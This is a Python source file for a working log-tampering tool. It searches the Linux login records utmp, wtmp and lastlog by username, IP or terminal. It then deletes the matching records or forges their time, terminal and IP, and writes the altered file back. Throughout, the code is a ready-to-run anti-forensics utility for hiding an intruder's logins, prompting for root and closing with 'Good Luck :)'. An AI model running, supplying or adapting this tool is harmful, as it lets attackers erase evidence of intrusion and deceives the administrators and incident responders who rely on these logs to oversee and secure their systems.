# -*- coding:utf-8 -*-

import struct
import pwd
import argparse
import sys
import os
import time


def wrapper(func):
    def _wrapper():
        try:
            matched, tamperlog = func()
            if matched:
                Print(put_color("[*]found matched log in ", "yellow")+FILENAME, level=0)
                for i in matched:
                    Print(put_color(i, "white"), level=1)

                if not VERBOSE or vars(__builtins__).get('raw_input', input)(put_color("\n[!]tamper them?", "white")+" [y]/n > ") != "n":
                    return tamperlog
                else:
                    Print(put_color("  [!]aborted", "yellow"), level=1)
            else:
                Print(put_color("[*]records not found!", "green"), level=0)
        except Exception as e:
            Print("%s %s %s" % (put_color("\n[X]match log:", "red"), FILENAME, put_color("failed", "red")), level=0)
            Print("  [-]reason: %s" % put_color(str(e), "white"), level=0)
    return _wrapper


@wrapper
def match_xmtplog():
    '''
    open xtmp/lastlog logfile and search for record.
    return **unmatched** record.
    '''

    tamperlog = b''
    matched = []
    with open(FILENAME, 'rb') as fp:
        while 1:
            bytes = fp.read(SIZE)
            if not bytes:
                break

            record = [str(i) if type(i) == int else i.replace(b"\x00", b"") for i in struct.unpack(STRUCT, bytes)]
            record = [i if i else b"[empty]" for i in record]
            if all([compare(clues[0], record[4]),  # search username
                    compare(clues[1], record[5]),  # search ip
                    compare(clues[2], record[2])]):  # search ttyname
                matched.append("  [-]"+b" ".join(
                    [record[4], record[2], record[5]]
                ).decode("utf8"))
                continue

            tamperlog += bytes

    return matched, tamperlog


def tamper_record(record):
    mtime, mtty, mip = int(record[0]), record[1], record[2]
    mtime_str, mtty_str, mip_str = put_color(
        time.strftime(
            "%Y-%m-%d %H:%M:%S", time.localtime(int(record[0]))
        ), "white"), put_color(record[1].decode("utf8"), "white"), put_color(record[2].decode("utf8"), "white")

    if MODE and (MTIME == None) or (type(MTIME) == int and int(MTIME)):
        if MTIME:
            mtime = int(MTIME)
            mtime_str = put_color(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(mtime)), "cyan")

        if MTTY:
            mtty = MTTY.encode("utf8")
            mtty_str = put_color(MTTY, "cyan")

        if MIP:
            mip_str = put_color(MIP, "cyan")
            mip = MIP.encode("utf8")

    else:
        mtime, mtty, mip = 0, b"\x00", b"\x00"
        mtime_str = put_color("1970-01-01 08:00:00", "cyan")
        mtty_str = mip_str = put_color("[empty]", "cyan")
        mip_str = put_color("[empty]", "cyan")

    # tamper_bytes = struct.pack(STRUCT, mtime, "{:\x00<32}".format(
    #    mtty).decode("utf8"), "{:\x00<64}".format(mip).decode("utf8"))
    tamper_bytes = struct.pack(STRUCT, mtime, mtty, mip)
    return tamper_bytes, [USERNAME,  mtty_str, mtime_str, mip_str]


@wrapper
def match_lastlog():
    matched = []
    try:
        pw = pwd.getpwnam(USERNAME)
        Print(put_color("  [-]user found", "gray"), level=2)
    except:
        Print(put_color("[!]user not found!", "yellow"), level=1)
        return [], ""

    with open(FILENAME, 'rb') as fp:
        bytes = fp.read()
        fp.seek(SIZE*pw.pw_uid)
        matched_bytes = fp.read(SIZE)
        if matched_bytes:
            record = [str(i) if type(i) == int else i.replace(b"\x00", b"")
                      for i in struct.unpack(STRUCT, matched_bytes)]
            record = [i if i else b"[empty]" for i in record]
            tamperlog, tampered = tamper_record(record)
            tamperlog = bytes.replace(matched_bytes, tamperlog)

            if int(record[0]):
                matched = ["  --- "+" ".join([
                    USERNAME,
                    record[1].decode("utf8"),  # ttyname
                    time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(int(record[0]))),  # time
                    record[2].decode("utf8"),  # ip
                ])+"\n  +++ "+" ".join(tampered)]

    return matched, tamperlog


def tamper_log(contents):
    '''
    tamper the log files.
    '''
    try:
        with open(FILENAME, 'wb') as fp:
            fp.write(contents)

        Print(put_color("  [-]tamper log success", "green")+check_cmd, level=0)
    except Exception as e:
        Print(put_color("\n[X]tamper log failed", "red"), level=0)
        Print("  [-]reason: %s" % put_color(str(e), "white"), level=0)


def compare(a, b):
    '''
    unassigned == None == True
    '''

    return a == None or a.encode('utf-8') == b


def put_color(string, color):
    colors = {
        u"gray": "2",
        u"red": "31",
        u"green": "32",
        u"yellow": "33",
        u"blue": "34",
        u"pink": "35",
        u"cyan": "36",
        u"white": "37",
    }

    return u"\033[40;1;%s;40m%s\033[0m" % (colors[color], string)


def Print(msg, level):
    '''
    control output

    level 0: important info
    level 1: normal info
    level 2: debug info
    '''

    if level <= VERBOSE:
        print(msg)


PATH = [
    "/var/run/utmp",
    "/var/log/wtmp",
    "/var/log/lastlog"
]

cmds = {
    0: "w",
    1: "last",
    2: "lastlog",
}


parser = argparse.ArgumentParser()
parser.add_argument('-l', '--log', type=int, required=True,
                    choices=[0, 1, 2], help='assign log file: [0:utmp]; 1:wtmp; 2:lastlog')

parser.add_argument('-u', '--username', help='match records based on username')
parser.add_argument('-i', '--ip', help='match records based on ip')
parser.add_argument('-t', '--ttyname', help='match records based on ttyname')

parser.add_argument('-f', '--filename',
                    help='if log filename is not in ["utmp", "wtmp", "lastlog"], give me the path and filename')
parser.add_argument('-v', '--verbose', default=1, type=int,
                    choices=[0, 1, 2], help='how much information you want: 0:silent; [1]; 2:debug')

parser.add_argument('-m', "--mode", action="store_true", help='clear or modify? default: clear')
parser.add_argument('-mtime', help='assign time. if you want "1997-01-01 08:00:00", mtime is 1997-01-01 08:00:00')
parser.add_argument('-mstime', help='assign time. if you want "1997-01-01 08:00:00", mstime is 0')
parser.add_argument('-mtty', help='assign ttyname, like: pts/1')
parser.add_argument('-mip', help='assign ip, like: 192.168.1.1')


args = parser.parse_args()
VERBOSE = args.verbose

Print(put_color("[+]analyse parameter", "gray"), level=2)
LOG = args.log
Print(put_color("  [-]tamper file: "+["utmp", "wtmp", "lastlog"][LOG], "gray"), level=2)
check_cmd = "\n  [-]check it with command: " + put_color(cmds[LOG], "white")

USERNAME = args.username
IP = args.ip
TTYNAME = args.ttyname

FILENAME = args.filename if args.filename else PATH[LOG]
if FILENAME:
    location = FILENAME
Print(put_color("  [-]location: "+location, "gray"), level=2)

MODE = args.mode
Print(put_color("  [-]mode: "+["clear", "modify"][MODE], "gray"), level=2)


# use mtime by default
MTIME = int(time.mktime(
    time.strptime(args.mtime, "%Y-%m-%d %H:%M:%S")
)) if args.mtime else args.mstime if args.mstime else args.mstime

MTTY = args.mtty
MIP = args.mip


LASTLOG_STRUCT = 'I32s256s'
LASTLOG_STRUCT_SIZE = struct.calcsize(LASTLOG_STRUCT)

XTMP_STRUCT = 'hi32s4s32s256shhiii4i20x'
XTMP_STRUCT_SIZE = struct.calcsize(XTMP_STRUCT)

STRUCT = [LASTLOG_STRUCT, XTMP_STRUCT][LOG in [0, 1]]
SIZE = [LASTLOG_STRUCT_SIZE, XTMP_STRUCT_SIZE][LOG in [0, 1]]


if not os.geteuid() == 0:
    Print(put_color("  [-]is root: "+"no", "gray"), level=2)
    if vars(__builtins__).get('raw_input', input)(put_color("[!]you are NOT ROOT", "red")+"\n  [-]continue? y/[n] > ") != "y":
        sys.exit(put_color("  [!]aborted", "yellow")+put_color("\n\nGood Luck :)", "green"))
    else:
        Print(put_color("  [-]as you wish\n", "yellow"), level=0)
else:
    Print(put_color("  [-]is root: "+"yes", "gray"), level=2)

Print(put_color("[+]analyse logfile", "gray"), level=2)
if LOG in [0, 1]:
    clues = [USERNAME, IP, TTYNAME]
    if not any(clues):  # clues is empty!
        sys.exit(put_color("[X]give me a username or ip or ttyname", "red"))

    # 0: change command: last
    # 1: change command: lastlog
    new_data = match_xmtplog()
    if new_data != None:
        tamper_log(new_data)
else:
    # 2: change command: w
    if not USERNAME:  # clues is username!
        sys.exit(put_color("[X]give me a username", "red"))

    new_data = match_lastlog()
    if new_data != None:
        tamper_log(new_data)

Print(put_color("\nGood Luck :)", "green"), level=0)
